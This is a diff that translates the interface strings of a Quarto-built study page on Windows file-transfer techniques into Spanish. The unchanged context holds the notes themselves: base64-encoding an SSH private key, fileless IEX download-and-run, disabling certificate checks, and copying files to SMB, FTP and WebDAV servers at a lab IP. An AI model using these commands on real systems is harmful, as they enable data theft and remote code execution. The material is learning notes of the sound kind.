@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" lang="../../es" xml:lang="../../es"><head>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="es-ES" xml:lang="es-ES"><head>
 
 <meta charset="utf-8">
 <meta name="generator" content="quarto-1.8.26">
@@ -90,17 +90,17 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
   ],
   "show-item-context": false,
   "language": {
-    "search-no-results-text": "No results",
-    "search-matching-documents-text": "matching documents",
-    "search-copy-link-title": "Copy link to search",
-    "search-hide-matches-text": "Hide additional matches",
-    "search-more-match-text": "more match in this document",
-    "search-more-matches-text": "more matches in this document",
-    "search-clear-button-title": "Clear",
+    "search-no-results-text": "No se han encontrado resultados",
+    "search-matching-documents-text": "documentos encontrados",
+    "search-copy-link-title": "Copiar el enlace en la búsqueda",
+    "search-hide-matches-text": "Ocultar resultados adicionales",
+    "search-more-match-text": "resultado adicional en este documento",
+    "search-more-matches-text": "resultados adicionales en este documento",
+    "search-clear-button-title": "Borrar",
     "search-text-placeholder": "",
-    "search-detached-cancel-button-title": "Cancel",
-    "search-submit-button-title": "Submit",
-    "search-label": "Search"
+    "search-detached-cancel-button-title": "Cancelar",
+    "search-submit-button-title": "Enviar",
+    "search-label": "Buscar"
   }
 }</script>
 
@@ -118,8 +118,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
     <span class="navbar-title">DevOps &amp; Security Learning Journey</span>
     </a>
   </div>
-            <div id="quarto-search" class="" title="Search"></div>
-          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+            <div id="quarto-search" class="" title="Buscar"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Navegación de palanca" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
   <span class="navbar-toggler-icon"></span>
 </button>
           <div class="collapse navbar-collapse" id="navbarCollapse">
@@ -187,7 +187,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <!-- margin-sidebar -->
     <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
         <nav id="TOC" role="doc-toc" class="toc-active">
-    <h2 id="toc-title">On this page</h2>
+    <h2 id="toc-title">En esta página</h2>
    
   <ul>
   <li><a href="#windows-file-transfer-methods" id="toc-windows-file-transfer-methods" class="nav-link active" data-scroll-target="#windows-file-transfer-methods">Windows File Transfer Methods</a>
@@ -244,13 +244,13 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="fu">md5sum</span> id_rsa</span>
 <span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Codificar a base64</span></span>
-<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> id_rsa <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-w</span> 0<span class="kw">;</span> <span class="bu">echo</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> id_rsa <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-w</span> 0<span class="kw">;</span> <span class="bu">echo</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>En Windows PowerShell:</strong></p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb2"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Decodificar base64 a archivo</span></span>
 <span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="op">[</span>IO<span class="op">.</span><span class="fu">File</span><span class="op">]::</span>WriteAllBytes<span class="op">(</span><span class="st">"C:\Users\Public\id_rsa"</span><span class="op">,</span> <span class="op">[</span>Convert<span class="op">]::</span>FromBase64String<span class="op">(</span><span class="st">"BASE64_STRING"</span><span class="op">))</span></span>
 <span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar hash</span></span>
-<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>Get-FileHash C<span class="op">:</span>\Users\Public\id_rsa <span class="op">-</span>Algorithm md5</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>Get-FileHash C<span class="op">:</span>\Users\Public\id_rsa <span class="op">-</span>Algorithm md5</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="subir-archivo-windows-linux" class="level3">
 <h3 class="anchored" data-anchor-id="subir-archivo-windows-linux">Subir archivo (Windows → Linux)</h3>
@@ -259,13 +259,13 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">[</span>Convert<span class="op">]::</span>ToBase64String<span class="op">((</span><span class="fu">Get-Content</span> <span class="op">-</span>path <span class="st">"C:\Windows\system32\drivers\etc\hosts"</span> <span class="op">-</span>Encoding byte<span class="op">))</span></span>
 <span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar hash</span></span>
-<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>Get-FileHash <span class="st">"C:\Windows\system32\drivers\etc\hosts"</span> <span class="op">-</span>Algorithm MD5</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>Get-FileHash <span class="st">"C:\Windows\system32\drivers\etc\hosts"</span> <span class="op">-</span>Algorithm MD5</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>En Linux:</strong></p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Decodificar base64</span></span>
 <span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"BASE64_STRING"</span> <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-d</span> <span class="op">&gt;</span> hosts</span>
 <span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar hash</span></span>
-<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="fu">md5sum</span> hosts</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="fu">md5sum</span> hosts</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Limitaciones:</strong> - cmd.exe tiene máximo 8,191 caracteres - Web shells pueden fallar con strings largos</p>
 </section>
 </section>
@@ -280,7 +280,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="op">(</span><span class="fu">New-Object</span> Net<span class="op">.</span><span class="fu">WebClient</span><span class="op">).</span><span class="fu">DownloadFileAsync</span><span class="op">(</span><span class="st">'https://example.com/file.ps1'</span><span class="op">,</span> <span class="st">'C:\Users\Public\file.ps1'</span><span class="op">)</span></span>
 <span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="co"># DownloadString (fileless)</span></span>
-<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="fu">IEX</span> <span class="op">(</span><span class="fu">New-Object</span> Net<span class="op">.</span><span class="fu">WebClient</span><span class="op">).</span><span class="fu">DownloadString</span><span class="op">(</span><span class="st">'https://example.com/script.ps1'</span><span class="op">)</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="fu">IEX</span> <span class="op">(</span><span class="fu">New-Object</span> Net<span class="op">.</span><span class="fu">WebClient</span><span class="op">).</span><span class="fu">DownloadString</span><span class="op">(</span><span class="st">'https://example.com/script.ps1'</span><span class="op">)</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="invoke-webrequest-powershell-3.0" class="level3">
 <h3 class="anchored" data-anchor-id="invoke-webrequest-powershell-3.0">Invoke-WebRequest (PowerShell 3.0+)</h3>
@@ -290,16 +290,16 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Alias</span></span>
 <span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https<span class="op">://</span>example<span class="op">.</span><span class="fu">com</span><span class="op">/</span>file<span class="op">.</span><span class="fu">ps1</span> <span class="op">-</span>OutFile file<span class="op">.</span><span class="fu">ps1</span></span>
 <span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="fu">curl</span> https<span class="op">://</span>example<span class="op">.</span><span class="fu">com</span><span class="op">/</span>file<span class="op">.</span><span class="fu">ps1</span> <span class="op">-</span>OutFile file<span class="op">.</span><span class="fu">ps1</span></span>
-<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="fu">iwr</span> https<span class="op">://</span>example<span class="op">.</span><span class="fu">com</span><span class="op">/</span>file<span class="op">.</span><span class="fu">ps1</span> <span class="op">-</span>OutFile file<span class="op">.</span><span class="fu">ps1</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="fu">iwr</span> https<span class="op">://</span>example<span class="op">.</span><span class="fu">com</span><span class="op">/</span>file<span class="op">.</span><span class="fu">ps1</span> <span class="op">-</span>OutFile file<span class="op">.</span><span class="fu">ps1</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="errores-comunes" class="level3">
 <h3 class="anchored" data-anchor-id="errores-comunes">Errores Comunes</h3>
 <p><strong>Error IE First-Run:</strong></p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb7"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Solución: usar -UseBasicParsing</span></span>
-<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="fu">Invoke-WebRequest</span> https<span class="op">://</span>example<span class="op">.</span><span class="fu">com</span><span class="op">/</span>file<span class="op">.</span><span class="fu">ps1</span> <span class="op">-</span>UseBasicParsing <span class="op">|</span> <span class="fu">IEX</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="fu">Invoke-WebRequest</span> https<span class="op">://</span>example<span class="op">.</span><span class="fu">com</span><span class="op">/</span>file<span class="op">.</span><span class="fu">ps1</span> <span class="op">-</span>UseBasicParsing <span class="op">|</span> <span class="fu">IEX</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Error SSL/TLS:</strong></p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb8"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Ignorar errores de certificado</span></span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="op">[</span>System<span class="op">.</span><span class="fu">Net</span><span class="op">.</span><span class="fu">ServicePointManager</span><span class="op">]::</span>ServerCertificateValidationCallback <span class="op">=</span> <span class="op">{</span><span class="va">$true</span><span class="op">}</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="op">[</span>System<span class="op">.</span><span class="fu">Net</span><span class="op">.</span><span class="fu">ServicePointManager</span><span class="op">]::</span>ServerCertificateValidationCallback <span class="op">=</span> <span class="op">{</span><span class="va">$true</span><span class="op">}</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
 <section id="smb-downloads" class="level2">
@@ -310,7 +310,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> impacket-smbserver share <span class="at">-smb2support</span> /tmp/smbshare</span>
 <span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Con usuario y contraseña</span></span>
-<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> impacket-smbserver share <span class="at">-smb2support</span> /tmp/smbshare <span class="at">-user</span> test <span class="at">-password</span> test</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> impacket-smbserver share <span class="at">-smb2support</span> /tmp/smbshare <span class="at">-user</span> test <span class="at">-password</span> test</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="descargar-en-windows" class="level3">
 <h3 class="anchored" data-anchor-id="descargar-en-windows">Descargar en Windows</h3>
@@ -319,7 +319,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a># Con autenticación</span>
 <span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>net use n: \\192.168.1.100\share <span class="at">/user:</span>test test</span>
-<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="bu">copy</span> n:\file.txt</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="bu">copy</span> n:\file.txt</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Nota:</strong> Windows moderno bloquea acceso anónimo por defecto.</p>
 </section>
 </section>
@@ -334,12 +334,12 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> python3 <span class="at">-m</span> pyftpdlib <span class="at">--port</span> 21</span>
 <span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Con permisos de escritura</span></span>
-<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> python3 <span class="at">-m</span> pyftpdlib <span class="at">--port</span> 21 <span class="at">--write</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> python3 <span class="at">-m</span> pyftpdlib <span class="at">--port</span> 21 <span class="at">--write</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="descargar-en-windows-1" class="level3">
 <h3 class="anchored" data-anchor-id="descargar-en-windows-1">Descargar en Windows</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb12"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Con PowerShell</span></span>
-<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="op">(</span><span class="fu">New-Object</span> Net<span class="op">.</span><span class="fu">WebClient</span><span class="op">).</span><span class="fu">DownloadFile</span><span class="op">(</span><span class="st">'ftp://192.168.1.100/file.txt'</span><span class="op">,</span> <span class="st">'C:\Users\Public\file.txt'</span><span class="op">)</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="op">(</span><span class="fu">New-Object</span> Net<span class="op">.</span><span class="fu">WebClient</span><span class="op">).</span><span class="fu">DownloadFile</span><span class="op">(</span><span class="st">'ftp://192.168.1.100/file.txt'</span><span class="op">,</span> <span class="st">'C:\Users\Public\file.txt'</span><span class="op">)</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="ftp-desde-cmd-no-interactivo" class="level3">
 <h3 class="anchored" data-anchor-id="ftp-desde-cmd-no-interactivo">FTP desde cmd (no interactivo)</h3>
@@ -348,7 +348,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> binary <span class="kw">&gt;&gt;</span> ftpcommand.txt</span>
 <span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> GET file.txt <span class="kw">&gt;&gt;</span> ftpcommand.txt</span>
 <span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> bye <span class="kw">&gt;&gt;</span> ftpcommand.txt</span>
-<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>ftp <span class="at">-v</span> <span class="at">-n</span> <span class="at">-s:</span>ftpcommand.txt</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>ftp <span class="at">-v</span> <span class="at">-n</span> <span class="at">-s:</span>ftpcommand.txt</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
 <section id="upload-operations" class="level2">
@@ -357,31 +357,31 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <h3 class="anchored" data-anchor-id="powershell-web-upload">PowerShell Web Upload</h3>
 <p><strong>Servidor (Linux):</strong></p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pip3</span> install uploadserver</span>
-<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> <span class="at">-m</span> uploadserver</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> <span class="at">-m</span> uploadserver</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Cliente (Windows):</strong></p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb15"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Descargar script de upload</span></span>
 <span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="fu">IEX</span><span class="op">(</span><span class="fu">New-Object</span> Net<span class="op">.</span><span class="fu">WebClient</span><span class="op">).</span><span class="fu">DownloadString</span><span class="op">(</span><span class="st">'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1'</span><span class="op">)</span></span>
 <span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Subir archivo</span></span>
-<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>Invoke-FileUpload <span class="op">-</span>Uri http<span class="op">://</span><span class="dv">192.168</span><span class="op">.</span><span class="dv">1.100</span><span class="op">:</span><span class="dv">8000</span><span class="op">/</span>upload <span class="op">-</span>File C<span class="op">:</span>\Windows\System32\drivers\etc\hosts</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>Invoke-FileUpload <span class="op">-</span>Uri http<span class="op">://</span><span class="dv">192.168</span><span class="op">.</span><span class="dv">1.100</span><span class="op">:</span><span class="dv">8000</span><span class="op">/</span>upload <span class="op">-</span>File C<span class="op">:</span>\Windows\System32\drivers\etc\hosts</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="smb-upload" class="level3">
 <h3 class="anchored" data-anchor-id="smb-upload">SMB Upload</h3>
 <p><strong>Con impacket-smbserver:</strong></p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb16"><pre class="sourceCode cmd code-with-copy"><code class="sourceCode dosbat"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="bu">copy</span> C:\Users\john\Desktop\SourceCode.zip \\192.168.1.100\share\</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb16"><pre class="sourceCode cmd code-with-copy"><code class="sourceCode dosbat"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="bu">copy</span> C:\Users\john\Desktop\SourceCode.zip \\192.168.1.100\share\</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="webdav-upload" class="level3">
 <h3 class="anchored" data-anchor-id="webdav-upload">WebDAV Upload</h3>
 <p><strong>Servidor (Linux):</strong></p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb17"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> pip3 install wsgidav cheroot</span>
-<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> wsgidav <span class="at">--host</span><span class="op">=</span>0.0.0.0 <span class="at">--port</span><span class="op">=</span>80 <span class="at">--root</span><span class="op">=</span>/tmp <span class="at">--auth</span><span class="op">=</span>anonymous</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> wsgidav <span class="at">--host</span><span class="op">=</span>0.0.0.0 <span class="at">--port</span><span class="op">=</span>80 <span class="at">--root</span><span class="op">=</span>/tmp <span class="at">--auth</span><span class="op">=</span>anonymous</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Cliente (Windows):</strong></p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb18"><pre class="sourceCode cmd code-with-copy"><code class="sourceCode dosbat"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="bu">dir</span> \\192.168.1.100\DavWWWRoot</span>
-<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="bu">copy</span> C:\file.txt \\192.168.1.100\DavWWWRoot\</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="bu">copy</span> C:\file.txt \\192.168.1.100\DavWWWRoot\</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="ftp-upload" class="level3">
 <h3 class="anchored" data-anchor-id="ftp-upload">FTP Upload</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb19"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="op">(</span><span class="fu">New-Object</span> Net<span class="op">.</span><span class="fu">WebClient</span><span class="op">).</span><span class="fu">UploadFile</span><span class="op">(</span><span class="st">'ftp://192.168.1.100/ftp-hosts'</span><span class="op">,</span> <span class="st">'C:\Windows\System32\drivers\etc\hosts'</span><span class="op">)</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb19"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="op">(</span><span class="fu">New-Object</span> Net<span class="op">.</span><span class="fu">WebClient</span><span class="op">).</span><span class="fu">UploadFile</span><span class="op">(</span><span class="st">'ftp://192.168.1.100/ftp-hosts'</span><span class="op">,</span> <span class="st">'C:\Windows\System32\drivers\etc\hosts'</span><span class="op">)</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
 <section id="resumen-de-métodos" class="level2">
@@ -453,12 +453,12 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
       // flash "checked"
       button.classList.add('code-copy-button-checked');
       var currentTitle = button.getAttribute("title");
-      button.setAttribute("title", "Copied!");
+      button.setAttribute("title", "Copiado");
       let tooltip;
       if (window.bootstrap) {
         button.setAttribute("data-bs-toggle", "tooltip");
         button.setAttribute("data-bs-placement", "left");
-        button.setAttribute("data-bs-title", "Copied!");
+        button.setAttribute("data-bs-title", "Copiado");
         tooltip = new bootstrap.Tooltip(button, 
           { trigger: "manual", 
             customClass: "code-copy-button-tooltip",
